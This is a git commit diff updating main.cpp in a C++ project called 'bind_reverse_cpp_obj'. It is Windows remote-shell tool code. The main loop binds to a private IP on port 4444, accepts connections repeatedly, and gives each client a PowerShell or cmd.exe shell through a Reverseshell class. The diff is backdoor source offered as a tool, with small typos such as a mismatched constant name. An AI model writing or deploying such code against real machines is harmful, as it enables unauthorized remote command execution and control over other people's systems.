ab66e95d2f30426e225be5cf3c98411c606cc1b3
devGnode <looterofflux@gmail.com>
2019-01-01 16:40:21 +0100

    Update main.cpp

--- bind_reverse_cpp_obj/main.cpp
+++ bind_reverse_cpp_obj/main.cpp
@@ -1,43 +1,53 @@
 #include <iostream>
 #include "windows.h"
 
-#include "socket.h"
-#include "ReverseShell.h"
-  
+#include "lib/socket.h"
+#include "lib/ReverseShell.h"
+   
 int main(int argc, char** argv) {
 	 
+	
+	HANDLE sck;
 	SOCKADDR_IN sin; 
 	Socket * sock;
 	Reverseshell * shell;
-	   
+	    
 	memset( &sin, 0, sizeof(sin) ); 
-	
+	 
 	sin.sin_family 		= AF_INET;
 	sin.sin_port   		= htons(4444);
-	sin.sin_addr.s_addr = inet_addr("192.168.1.15");
+	sin.sin_addr.s_addr = inet_addr("192.168.1.18");
 	 
 	sock = new Socket( &sin );
   	shell= new Reverseshell( );
-   	
-  	if( sock->valid( ) ){
-  		
-  		sock->Bind();
-  		sock->Listen(1);
-  		for(;;){
-  		 	
-  			Socket * clts;
+   	 
+  	if( sock->valid( ) ){  
+  		  
+  		sock->Bind();  
+  		sock->Listen(1);  
+  		for(;;){ 
+  
+  			Socket  * clts;
   			SOCKADDR_IN csin = {0};
-  			
+  			       
   			if( ( clts = sock->Accept( &csin ) )->valid( ) ){
-  				shell->get( clts );
-  				sock->Clean( );
-			}	
+  				 
+				// WIN_CMD = cmd.exe
+				// WIN_PSW = powershell.exe
+  	 			if( !shell->get( clts, WIN_PWS ) ){
+  	 				clts->Close();; 	
+				}else
+				printf("[+] New user\r\n");;
+			}
+			Sleep(200);	
 		}
 		 
   		sock->Close( );
-	}
+  		
+	}else
+	printf("[-] Sokcet invalid !");;
 	
 	ExitProcess(0);
-
+  
 	return 0;
 }
